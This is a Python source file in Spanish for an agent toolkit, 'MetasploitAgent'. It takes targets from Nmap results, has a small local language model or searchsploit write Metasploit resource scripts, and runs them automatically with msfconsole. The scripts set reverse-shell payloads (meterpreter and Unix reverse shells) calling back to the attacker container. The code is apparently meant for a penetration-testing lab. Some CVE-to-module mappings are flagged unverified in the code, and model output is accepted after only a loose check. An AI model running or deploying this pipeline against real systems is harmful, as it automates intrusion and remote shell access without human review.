import json
import os
import socket
import subprocess
import requests
from typing import Dict, List
from datetime import datetime

from agno.tools.toolkit import Toolkit
from agno.utils.log import logger

import logging

logger.setLevel(logging.DEBUG)
results_dir = "/results"
os.makedirs(results_dir, exist_ok=True)
log_file = "/results/combined.log"
file_handler = logging.FileHandler(log_file)
file_handler.setLevel(logging.DEBUG)
formatter = logging.Formatter('%(asctime)s [%(name)s] %(levelname)s: %(message)s')
file_handler.setFormatter(formatter)
logger.addHandler(file_handler)


class MetasploitAgent(Toolkit):
    def __init__(self):
        super().__init__(name="MetasploitAgent")
        self.register(self.run)
        self.ollama_url = "http://ollama:11434/api/generate"
        self.model = "llama3.2:1b"
        self.results_dir = "/results"
        self.lhost = self._get_container_ip()
        self.lport = 4444

    def _get_container_ip(self) -> str:
        """Obtiene la IP del contenedor actual."""
        try:
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            logger.info(f"IP del contenedor detectada: {ip}")
            return ip
        except Exception as e:
            logger.warning(f"No se pudo obtener la IP dinámica: {e}, usando fallback 172.18.0.4")
            return "172.18.0.4"

    def get_payload(self, os_info: str) -> str:
        """Elige un payload según el OS detectado o el servicio."""
        os_info = os_info.lower()
        if "windows" in os_info:
            return "windows/meterpreter/reverse_tcp"
        elif "linux" in os_info or "unix" in os_info or "debian" in os_info:
            return "cmd/unix/reverse"
        else:
            logger.warning(f"OS desconocido: {os_info}, seleccionando payload según servicio")
            return "cmd/unix/reverse" if "http" in self.name.lower() else "generic/shell_reverse_tcp"

    def generate_exploit_llm(self, ip: str, port: str, service: str, os_info: str, vuln_id: str = None,
                                 vulners: List[Dict] = None) -> str | None:
            """Genera un script de Metasploit usando el LLM con instrucciones condicionales."""
            vuln_prompt = f" para la vulnerabilidad {vuln_id}" if vuln_id else ""
            vulners_info = f"Vulnerabilidades detectadas: {json.dumps(vulners)}" if vulners else "Sin vulnerabilidades específicas detectadas."
            payload = self.get_payload(os_info)
            file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
            file_path = f"/tmp/exploit_{vuln_id or 'generic'}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

            prompt = f"""
            Genera un script de Metasploit (.rc) para explotar un servicio {service} en {ip}:{port}{vuln_prompt} en un sistema {os_info}.
            {vulners_info}
            Usa un exploit conocido de Metasploit basado en la información proporcionada. Sigue estas instrucciones:
            - Si el servicio es HTTP y el sistema es Linux, considera exploits como 'multi/http/apache_mod_cgi_bash_env_exec' o 'multi/http/php_cgi_arg_injection'.
            - Si hay vulnerabilidades específicas (CVEs), elige un exploit relacionado (e.g., 'multi/http/dvwa_login_bypass' para DVWA).
            - Si no hay coincidencias claras, usa un exploit genérico como 'multi/handler'.
            - Incluye 'set TARGETURI' si el exploit lo requiere (e.g., '/cgi-bin/' para Apache CGI, '/' para otros).
            - Configura:
              - set RHOSTS {ip}
              - set RPORT {port}
              - set PAYLOAD {payload}
              - set LHOST {self.lhost}
              - set LPORT {self.lport}
              - exploit
            - Post-explotación: crea un archivo '{file_path}' con 'Exploited by Metasploit' usando '{file_cmd}'.
            - Termina con 'exit'.
            Devuelve solo el script.
            """

            try:
                response = requests.post(self.ollama_url, json={"model": self.model, "prompt": prompt, "stream": False},
                                         timeout=60)  # Aumentado a 60s como antes
                response.raise_for_status()
                script = response.json().get("response", "").strip()
                if "use " in script and "exploit" in script:
                    logger.debug(f"Script LLM generado para {vuln_id or 'generic'}: {script}")
                    return script
                logger.warning(f"Script LLM inválido para {vuln_id or 'generic'}, usando fallback")
            except Exception as e:
                logger.error(f"Error con LLM para {vuln_id or 'generic'}: {e}")

            # Fallback mínimo
            script = f"""
    use multi/handler
    set RHOSTS {ip}
    set RPORT {port}
    set PAYLOAD {payload}
    set LHOST {self.lhost}
    set LPORT {self.lport}
    exploit
    {file_cmd} 'Exploited by Metasploit' > {file_path}
    exit
    """
            logger.info(f"Usando script de respaldo genérico")
            return script

    def generate_exploit_searchsploit(self, ip: str, port: str, service: str, os_info: str) -> List[str]:
        """
        Busca exploits con searchsploit y genera scripts básicos.
        todo
        Esto debería buscar a SearchsploitAgent.run() en vez de ejecutar esta lógica.
        """
        scripts = []
        payload = self.get_payload(os_info)
        file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
        file_path = f"/tmp/exploit_searchsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt" if "unix" in payload or "linux" in payload else f"C:\\exploit_searchsploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"

        try:
            cmd = ["searchsploit", "-j", service, f"port {port}"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            if result.returncode == 0:
                exploits = json.loads(result.stdout).get("RESULTS_EXPLOIT", [])
                for exploit in exploits[:3]:  # Limitar a 3
                    exploit_name = exploit["Title"].lower().replace(" ", "_")
                    logger.info(f"[+] Exploit encontrado en searchsploit: {exploit_name}")
                    script = f"""
use exploit/{exploit_name}
set RHOSTS {ip}
set RPORT {port}
set PAYLOAD {payload}
set LHOST {self.lhost}
set LPORT {self.lport}
exploit
{file_cmd} 'Exploited by Metasploit' > {file_path}
exit
"""
                    scripts.append(script)
            if not scripts:
                logger.warning("[!] No se encontraron exploits en searchsploit")
            return scripts
        except Exception as e:
            logger.error(f"[!] Error con searchsploit: {e}")
            return []

    def generate_exploit_vulners(self, ip: str, port: str, service: str, os_info: str, vulners: List[Dict]) -> List[
        str]:
        """Genera scripts basados en vulners del JSON de Nmap."""
        scripts = []
        # Mapeo simple de CVEs a exploits conocidos
        cve_to_exploit = {
            "CVE-2021-40438": "exploit/multi/http/apache_mod_cgi_bash_env_exec",
            "CVE-2023-25690": "exploit/multi/http/apache_requisition",  # Ejemplo, verificar existencia
            "CVE-2022-22720": "exploit/multi/http/apache_http_server_rce"
        }

        for vuln in vulners:
            vuln_id = vuln.get("id", "unknown")
            if vuln.get("exploit", False):
                exploit = cve_to_exploit.get(vuln_id)
                if exploit:
                    payload = self.get_payload(os_info)
                    file_cmd = "echo" if "unix" in payload or "linux" in payload else "echo."
                    file_path = f"/tmp/exploit_{vuln_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                    script = f"""
    use {exploit}
    set RHOSTS {ip}
    set RPORT {port}
    set PAYLOAD {payload}
    set LHOST {self.lhost}
    set LPORT {self.lport}
    exploit
    {file_cmd} 'Exploited by Metasploit' > {file_path}
    exit
    """
                    logger.info(f"[+] Script generado para {vuln_id} con exploit {exploit}")
                    scripts.append(script)
                else:
                    # Intentar con LLM como respaldo
                    script = self.generate_exploit_llm(ip, port, service, os_info, vuln_id)
                    if script:
                        scripts.append(script)
        return scripts

    def run(self, **kwargs) -> Dict[str, str]:
        json_file = kwargs.get('json_file', '/results/nmap_result.json')
        timeout = kwargs.get('timeout', 600)

        if not os.path.exists(json_file):
            logger.error(f"No se encontró {json_file}")
            return {"error": f"No se encontró {json_file}"}

        try:
            with open(json_file, 'r') as f:
                nmap_data = json.load(f)
        except json.JSONDecodeError:
            logger.error(f"Error al decodificar {json_file}")
            return {"error": f"Error al decodificar {json_file}"}

        target_data = nmap_data.get("target", {})
        ip = target_data.get("ip")
        port = target_data.get("port")
        service = target_data.get("service")
        os_info = target_data.get("os", "unknown")
        vulners = nmap_data.get("tools", {}).get("metasploit", {}).get("vulners", [])  # Ajustado a tu estructura

        if not all([ip, port, service]):
            logger.warning("Datos incompletos en 'target' para Metasploit")
            return {"warning": "Datos incompletos en 'target' para Metasploit"}

        target = f"{ip} {port} {service}"
        results = {}

        # Generar scripts solo con LLM
        scripts = [self.generate_exploit_llm(ip, port, service, os_info, None, vulners)]  # Script genérico
        for vuln in vulners[:3]:  # Limitar a 3 vulnerabilidades
            script = self.generate_exploit_llm(ip, port, service, os_info, vuln.get("id"), vulners)
            if script:
                scripts.append(script)

        if not scripts:
            logger.warning("No se generaron scripts de exploit")
            results[target] = "Error: No se generaron scripts de exploit"
            return results

        # Ejecutar scripts
        for idx, script in enumerate(scripts):
            try:
                logger.info(f"Probando exploit {idx + 1}/{len(scripts)} para {target} (OS: {os_info})...")
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                script_path = f"{self.results_dir}/exploit_{ip}_{port}_{idx}_{timestamp}.rc"
                with open(script_path, "w") as f:
                    f.write(script)
                logger.debug(f"Script guardado: {script_path}")

                command = ["/usr/bin/msfconsole", "-q", "-r", script_path]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate(timeout=timeout)

                output_path = f"{self.results_dir}/output_{ip}_{port}_{idx}_{timestamp}.txt"
                with open(output_path, "w") as f:
                    f.write(stdout + "\n" + stderr)
                logger.info(f"Salida guardada en {output_path}")

                if process.returncode == 0 and "Exploit completed" in stdout:
                    file_path = next((line.split("> ")[1] for line in script.split("\n") if "> " in line), "unknown")
                    logger.info(f"Exploit {idx + 1} ejecutado con éxito en {target}")
                    results[f"{target}_exploit_{idx}"] = f"Éxito: Archivo creado en {file_path}, salida en {output_path}"
                else:
                    logger.error(f"Error en exploit {idx + 1} para {target}: {stderr or 'Sin detalles'}")
                    results[f"{target}_exploit_{idx}"] = f"Error: {stderr or 'Sin detalles'}, salida en {output_path}"

                self.lport += 1  # Evitar conflictos
            except Exception as e:
                logger.error(f"Error en exploit {idx + 1} para {target}: {e}")
                results[f"{target}_exploit_{idx}"] = f"Error: {e}"

        return results


if __name__ == "__main__":
    agent = MetasploitAgent()
    result = agent.run()
    print(json.dumps(result, indent=2))